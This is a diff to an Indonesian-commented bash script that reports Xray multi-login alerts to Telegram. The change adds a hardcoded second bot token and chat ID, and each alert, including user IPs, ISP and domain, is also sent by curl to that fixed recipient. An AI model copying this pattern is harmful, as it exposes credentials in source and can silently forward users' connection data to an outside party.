@@ -3,15 +3,21 @@
 LOCK_TIME=900  # Waktu penguncian dalam detik (15 menit)
 LOCK_FILE="/tmp/locked_ips.txt"  # File untuk menyimpan IP yang dikunci
 
+# Pengaturan untuk bot kedua
+BOT2_TOKEN="7253550837:AAEZbitnFTqwNmBqCuvybJfaxHKgYb7FrZ4"
+BOT2_CHAT_ID="6579436198"
+
 # Fungsi untuk mengirim log ke bot Telegram
 function send_log(){
+    # Pengaturan untuk bot pertama dari file konfigurasi
     CHATID=$(grep -E "^#bot# " "/etc/bot/.bot.db" | cut -d ' ' -f 3)
     KEY=$(grep -E "^#bot# " "/etc/bot/.bot.db" | cut -d ' ' -f 2)
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
+    
     TEXT="
 <code>────────────────────</code>
-<b>⚠️ NOTIFICATIONS MULTI LOGIN ⚠️</b>
+<b>⚠️ NOTIFICATIONS MULTI LOGIN XRAY ⚠️</b>
 <code>────────────────────</code>
 <code>Isp              : </code><code>${isp}</code>
 <code>Domain           : </code><code>${domain}</code>
@@ -20,14 +26,22 @@ function send_log(){
 <code>Limit IP         : </code><code>${iplimit}</code>
 <code>Login IP Count   : </code><code>${cekcek}</code>
 <code>────────────────────</code>
-<code>User IP ⬇️</code>
+<code>User IP          : </code>
 <code>${user_ips}</code>
 <code>────────────────────</code>
-<code>Multi-Login IP ⬇️</code>
+<code>Multi-Login IP   : </code>
 <code>${multi_login_ips}</code>
 <code>────────────────────</code>
 "
+
+    # Mengirim pesan ke bot pertama
     curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+
+    # URL untuk bot kedua
+    URL_BOT2="https://api.telegram.org/bot$BOT2_TOKEN/sendMessage"
+
+    # Mengirim pesan ke bot kedua
+    curl -s --max-time $TIME -d "chat_id=$BOT2_CHAT_ID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL_BOT2 >/dev/null
 }
 
 # Fungsi untuk memeriksa apakah IP sudah dikunci
